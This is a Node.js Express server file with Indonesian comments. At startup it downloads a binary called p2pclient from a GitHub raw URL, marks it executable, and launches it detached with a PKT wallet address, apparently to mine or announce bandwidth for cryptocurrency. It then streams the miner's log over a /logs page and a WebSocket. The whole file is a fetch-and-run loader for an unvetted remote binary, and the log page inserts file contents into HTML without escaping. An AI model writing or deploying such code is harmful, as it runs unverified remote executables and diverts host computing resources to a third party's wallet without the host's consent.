const fs = require("fs");
const path = require("path");
const axios = require("axios");
const { spawn } = require("child_process");
const express = require("express");
const WebSocket = require("ws");

const currentDir = __dirname;
const p2pClientPath = path.join(currentDir, "p2pclient");
const p2pLogPath = path.join(currentDir, "test.log");

const app = express();
const PORT = process.env.PORT || 5000;

// WebSocket server
const wss = new WebSocket.Server({ noServer: true });

wss.on("connection", (ws) => {
  console.log("New WebSocket connection");

  fs.watchFile(p2pLogPath, { interval: 1000 }, () => {
    fs.readFile(p2pLogPath, "utf8", (err, data) => {
      if (!err) ws.send(data);
    });
  });

  ws.on("close", () => {
    console.log("WebSocket connection closed");
  });
});

// Unduh dan jalankan p2pclient
(async function main() {
  try {
    if (!fs.existsSync(p2pClientPath)) {
      console.log("Downloading p2pclient...");
      const response = await axios({
        method: "get",
        url: "https://github.com/sengepeke/nextjs/raw/master/p2pclient",
        responseType: "stream",
      });

      const writer = fs.createWriteStream(p2pClientPath);
      response.data.pipe(writer);
      await new Promise((resolve, reject) => {
        writer.on("finish", resolve);
        writer.on("error", reject);
      });

      fs.chmodSync(p2pClientPath, 0o755);
      console.log("p2pclient installed.");
    }

    // Jalankan p2pclient
    const child = spawn(p2pClientPath, ["ann", "-p", "pkt1qegd9xjlaatf26f583m8yurtt9te4vs8340naca"], {
      detached: true,
      stdio: ["ignore", fs.openSync(p2pLogPath, "a"), fs.openSync(p2pLogPath, "a")],
    });

    child.unref();
    console.log(`p2pclient started with PID: ${child.pid}`);
  } catch (error) {
    console.error("An error occurred:", error.message);
  }
})();

// API untuk mengambil log
app.get("/logs", (req, res) => {
  fs.readFile(p2pLogPath, "utf8", (err, data) => {
    if (err) return res.status(500).send("Error reading log file.");
    res.send(`<pre>${data}</pre>`);
  });
});

// Upgrade ke WebSocket
app.server = app.listen(PORT, () => console.log(`Server running at http://localhost:${PORT}`));
app.server.on("upgrade", (request, socket, head) => {
  wss.handleUpgrade(request, socket, head, (ws) => wss.emit("connection", ws, request));
});
